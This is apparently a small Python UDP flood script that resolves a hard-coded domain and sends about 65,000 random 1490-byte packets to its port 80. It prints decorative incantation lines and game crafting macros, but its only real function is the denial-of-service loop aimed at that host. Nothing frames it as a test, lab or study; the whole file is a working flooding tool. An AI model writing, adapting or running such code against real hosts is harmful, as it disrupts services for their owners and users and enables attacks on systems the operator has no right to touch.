# Import.
from datetime import timedelta
from   platform import system
from   tqdm.auto import tqdm
import os
import time
import random
import socket
import pyfiglet
import datetime

# Socket
sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# Cast
print('To all of my children in whom Life flows abundant...')
print('To all of my children to whom Death hath passed his judgement...')
print('The soul yearns for honor, and the flesh the hereafter...')
print('Look to those who walked before to lead those who walk after...')
print('')
print('Hear...Feel...Think...')
time.sleep(1)
print('-----------------------------------')
print('/ac Reflect <wait.3>')
print('/ac Manipulation <wait.2>')
print('/ac Preparatory Touch <wait.1>')
print('/ac Preparatory Touch <wait.1>')
print('/ac Great Strides <wait.2>')
print("/ac Byregot's Blessing <wait.3>")
print('/ac Great Veneration <wait.2>')
print('/ac Groundwork <wait.1>')
print('/ac Groundwork')
print('')

# Get ip.
url = "fwe88.top"
ip = socket.gethostbyname(url)

# Value.
sent = 1
i = 1
port = 80

#ululu alala
if i == 1:
    try:
        while True:
            if i == 65535:
                exit()

            sock.sendto(bytes, (str(ip), port))
            sent += 1
            i += 1
            now = datetime.datetime.now()
            dtime = now.strftime("%Y-%m-%d %H:%M:%S")
            
    except:
        print('[%s]Sented %s packets to %s(%s) through port:%s'%(dtime, sent, url, ip, port))
